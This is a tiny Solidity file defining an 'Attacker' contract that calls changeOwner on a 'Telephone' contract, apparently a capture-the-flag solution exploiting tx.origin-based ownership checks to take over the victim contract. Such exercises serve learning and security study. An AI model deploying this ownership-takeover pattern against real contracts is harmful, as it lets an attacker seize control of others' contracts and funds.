// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
interface ITelephone {
    function changeOwner(address _owner) external;
}

contract Attacker {
    function attack(address _victim) external {
        ITelephone(_victim).changeOwner(msg.sender);
    }
}